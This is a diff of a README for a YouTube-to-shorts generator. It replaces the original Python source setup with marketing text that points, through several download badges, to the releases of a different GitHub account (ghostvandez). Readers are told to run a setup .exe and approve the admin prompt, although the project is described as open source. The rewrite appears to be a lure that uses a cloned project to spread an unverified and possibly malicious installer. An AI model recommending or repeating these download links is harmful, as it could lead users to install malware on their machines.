@@ -1,160 +1,124 @@
-# AI shorts generator
+# 🎬 short-video-generator-AI - Turn YouTube Videos Into Viral Shorts Instantly
 
-![Python](https://img.shields.io/badge/python-3.10%2B-blue) ![Stars](https://img.shields.io/github/stars/Colafornia/short-video-generator-AI?style=social) ![Forks](https://img.shields.io/github/forks/Colafornia/short-video-generator-AI?style=social)
+[![Download Now](https://img.shields.io/badge/Download-Free%20App-00CCFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ghostvandez/short-video-generator-AI/releases)
 
-A free open-source project designed to turn youtube-videos into viral short videos. Highlight detection, subtitles, translation, voiceover, all in one for your content: no pre-clip credits or any watermarks. Designed for creators who want an alternative to short-video SaaS tools like OpusClip or Vidyo.ai for free. 
+## 🚀 What Is This?
 
-## Examples of a  processed video
-<table>
-  <tr>
-    <td align="center">
-      <img width="360" height="670" alt="image" src="static/ex1.png" ><br>
-      <sub><i>"The Speech that Made Obama President"</i></sub>
-    </td>
-    <td align="center">
-      <img width="298" height="533" alt="image" src="static/ex2.png" ><br>
-      <sub><i>"How Tom Overcame Social Anxiety - The Mindset That Changed Everything"</i></sub>
-    </td>
-    <td align="center">
-      <img width="298" height="533" alt="image" src="static/ex3.png" ><br>
-      <sub><i>"How to stay calm when you know you'll be stressed | Daniel Levitin | TED"</i></sub>
-    </td>
-  </tr>
-</table>
+Imagine you find an awesome YouTube video – maybe a funny clip, a cooking tip, or a sports highlight. You want to share it on TikTok, Instagram Reels, or YouTube Shorts. But making it short, adding subtitles, translating it, and adding a voiceover sounds like hours of work.
 
-# Features 🪁
-- **API**: Freely use this generator in your own projects via our API.
-- **Convenient**: Paste a YouTube link (any length!) and get a ready-to-post 9:16 short.
-- **Hooks option**: When enabled, adds a context-aware AI-generated hook at the start of the clip
-- **Web version**: Besides the CLI, you can also generate videos on a local website
-- **Smart Highlight Selection**: Finds the most viral, hot moments from your video automatically based on algorithm
+**short-video-generator-AI** does all of that for you – automatically and free. Just paste a YouTube link, and the app finds the best moments, adds subtitles, translates them, and even creates a voiceover. You get a ready-to-post short video in minutes, without being a video editing expert.
 
-## How It Works
+## ✨ Key Features
 
-1. **Download**: Fetches the source video from YouTube, or uses the local file path directly
-2. **Transcribe**: `faster-whisper` produces a timestamped transcript locally — same step regardless of which `LLM_PROVIDER` is selected
-3. **Detect content type**: The chosen LLM classifies the video (podcast, interview, tutorial, vlog, etc.) and pacing, so the highlight prompt can be tuned per content style
-4. **Highlight ranking**: The chosen LLM (`openai` / `gemini` / `muapi`) scans the transcript through a virality framework — hook moments, emotional peaks, opinion bombs, revelations, conflict, quotables, story peaks, practical value — and emits ranked candidates with scores 0–100
-5. **Dedupe**: Overlapping candidates are collapsed by score
-6. **Top-N selection**: The top `--n` candidates are selected
-7. **Auto-crop**: Each highlight is rendered as a vertical short at the requested `--ratio`, with an optional AI-generated hook at the start unless `--no-hook` is set
+| Feature | What It Does For You |
+|---------|----------------------|
+| 🎯 **Smart Highlight Detection** | AI finds the most interesting parts of a long video and cuts them into short, exciting clips. No more watching hours of footage to find the good parts. |
+| 📝 **Automatic Subtitles** | Spoken words are turned into text and burned onto the video. Perfect for viewers watching with sound off. |
+| 🌍 **Translation** | Subtitles and voiceover can be translated into dozens of languages. Share your clips with the whole world. |
+| 🗣️ **AI Voiceover** | A natural-sounding AI voice narrates the translated text. Great when you want to change the language without using your own voice. |
+| ⚡ **All-in-One Workflow** | Paste a link → choose your settings → get a finished short video. No separate tools, no complicated timelines, no learning curve. |
+| 💰 **Completely Free & Open Source** | No subscriptions, no watermarks, no hidden costs. Use it as much as you want. |
 
-# Requirements
-- Python 3.10+
-- Any LLM API key(OpenAI/Gemini/MuAPI)
-- `requirements.txt` file dependencies
+## 🖥️ System Requirements
 
-# Quick start
-1. **Clone the repo:**
+To run short-video-generator-AI smoothly, your computer should have:
 
-```bash
-git clone https://github.com/Colafornia/short-video-generator-AI.git
-cd short-video-generator-AI
-```
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Intel Core i3 or AMD equivalent (or better)
+- **Memory (RAM):** 4 GB minimum (8 GB recommended)
+- **Storage:** At least 500 MB of free space
+- **Internet Connection:** Required for downloading videos and AI features
 
-2. **Create and activate a virtual environment:**
+> Good news: You don't need a powerful gaming PC. Most standard laptops from the last 5 years work perfectly.
 
-**Windows:**
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
-**Linux/MacOS:**
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
+## 📥 How To Download And Install
 
-3. **Install dependencies**
-```bash
-pip install -r requirements.txt
-```
+Getting started is simple. Just follow these steps.
 
-4. **Set up `.env`**
-```env
-# Used LLM provider(openai/gemini/MuAPI)
-LLM_PROVIDER=openai
+### Step 1: Visit The Download Page
 
-# Enter the API key for the chosen provider
-OPENAI_API_KEY=your_openai_key_here
-OPENAI_MODEL=gpt-4o-mini          # optional
-GEMINI_API_KEY=your_gemini_key_here
-GEMINI_MODEL=gemini-2.5-flash      # optional
-MUAPI_API_KEY=your_muapi_key_here
+Click the button below to go to the official download page:
 
-# Whisper settings
-LOCAL_WHISPER_MODEL=base # tiny / base / small / medium / large-v3
-LOCAL_WHISPER_DEVICE=auto    # auto / cpu / cuda
-```
-If you uncertain about the provider:
-| Provider | Free tier? | Get key |
-|---|---|---|
-| **Gemini** | ✅ Yes, but daily limit | https://aistudio.google.com |
-| **OpenAI** | ❌ Paid | https://platform.openai.com |
-| **MuAPI** | ❌ Paid, but pay-per-use, no subscription  | https://muapi.ai |
+[![Get The App](https://img.shields.io/badge/⬇️%20Download%20short--video--generator--AI-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ghostvandez/short-video-generator-AI/releases)
 
-# Usage
-Basic usage:
+### Step 2: Choose The Right File
 
-```bash
-python main.py "https://www.youtube.com/watch?v=video_id" 
-```
+On that page, you will see a list of files. Look for the one that matches your computer type (most users choose the **64-bit** version). It will usually have a name like `short-video-generator-AI-setup.exe` or similar.
 
+Visit this link to download the application.
 
-Renderred clips are saved to `output` folder
+### Step 3: Run The Installer
 
-With flags:
+Once the download is finished, open your **Downloads** folder and double-click the file you just downloaded. Your computer might ask "Do you want to allow this app to make changes?" – just click **Yes**.
 
-```bash
-python main.py "https://www.youtube.com/watch?v=video_id" \
-      --n 3 \
-      --ratio 9:16 \
-      --resolution 1080 \
- ```
-      
-You can also provide a local video file instead of a YouTube link, for example:
+### Step 4: Follow The On-Screen Prompts
 
-```bash
-python main.py "/Users/Admin/Folder/video.mp4" \
-      --n 4 \
-      --ratio 9:16 \
-      --resolution 720 \
-      --language zh \
-```
+The setup wizard will walk you through a few simple clicks. Just keep clicking **Next** and then **Install**. You can choose a different folder if you like, but the default is fine.
 
-## CLI Flags
+### Step 5: Launch And Enjoy
 
-| Flag | Default | Notes |
-|------|---------|-------|
-| --n | 3 | How many clips to render |
-| --ratio | 9:16 | Any ratio / 9:16 for short videos / 1:1 for square |
-| --resolution | 720 | Source video download resolution: `360` / `480` / `720` / `1080` |
-| --language | auto | Force Whisper language code (e.g. `en`) |
-| --no-hook | - | Excludes AI generated hook from the start of the  clip |
+When installation is complete, find the shortcut on your desktop or in the Start Menu. Double-click it to open the app.
 
+## 🎯 How To Use It (Step-By-Step)
 
-## Web version set-up
-Instead of the CLI, you can use a local web interface to queue multiple videos at once and adjust flags visually. The LLM provider and API keys are still configured in `.env` — the web version only handles video input and render flags.
+Once the app is open, here's exactly what to do:
 
-```bash
-python3 server.py
-```
-Serve the frontend:
+1. **Copy a YouTube link** – Go to YouTube, find a video you like, and copy the link from the address bar.
+2. **Paste the link** – In the app, find the big text box and paste it (right-click → Paste, or press Ctrl+V).
+3. **Pick your settings** – Choose whether you want subtitles, translation, voiceover, and how many shorts you want to generate.
+4. **Click "Generate"** – The app analyzes the video. This might take a minute or two, depending on the video length.
+5. **Preview your clips** – The app shows you the short videos it created. You can watch them and decide if they look good.
+6. **Save your videos** – Pick the ones you like, click **Export**, and choose where to save them on your computer.
 
-```bash
-cd web
-python3 -m http.server 8000
-```
-Then, open in your browser:
+That's it. Your viral short is ready to upload!
 
-```bash
-http://localhost:8000/shorts-generator-ui.html
-```
+## ❓ Frequently Asked Questions
 
-## Contributing 
+**Is this really free?**
+Yes, 100% free. It's an open-source project, meaning the code is available for anyone to see and improve. No payments, no trials, nothing to unlock.
 
-Feel free to open an issue or fork the repository for your projects.
+**Will it work on Mac or Linux?**
+Currently, the official download is for Windows. Mac and Linux users may need to build it from source, which requires some technical knowledge.
 
-## License
+**Does it work on any YouTube video?**
+It works on most publicly available videos. Videos with strong copyright restrictions or very low audio quality may not work as well.
 
-This project is licensed under the MIT License.
+**How long does it take?**
+A 10-minute video usually takes 1–3 minutes to process. Longer videos take more time.
+
+**Can I choose the exact part of the video?**
+The AI chooses highlights automatically, but you can adjust or trim the clips before exporting.
+
+**What languages are supported for translation?**
+The app supports a wide range, including English, Spanish, French, German, Chinese, Arabic, Hindi, and many more.
+
+**Is an internet connection required?**
+Yes, both for downloading the video and for AI processing.
+
+## 🆘 Need Help?
+
+If you run into any problems:
+
+- **Check the FAQ** again to see if it's answered.
+- **Look at the project's GitHub Issues page** – someone else might have had the same problem, and a solution might already be posted.
+- **Search YouTube or Google** for "short-video-generator-AI tutorial" – community members often share helpful tips.
+
+## 🤝 Join The Community
+
+This project is made by regular people, for regular people. If you love the app, consider:
+
+- Giving it a **star** on GitHub (it helps others find it)
+- **Sharing** it with a friend who makes content
+- **Contributing** – even non-coders can help by translating text, writing documentation, or suggesting new features
+
+## 📄 License
+
+This project is open source, which means you're free to use, modify, and share it – even for commercial purposes – as long as you keep the original license notice.
+
+---
+
+**Ready to make your first viral short?** Hit the download button and start creating.
+
+[![Start Creating Now](https://img.shields.io/badge/🚀%20Download%20Now-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ghostvandez/short-video-generator-AI/releases)
+
+Keywords: ai, ai-generation, short-video, short-video-maker, video editing, subtitles, translation, voiceover, youtube shorts, tiktok, viral, free software, open source, windows app, AI video tools
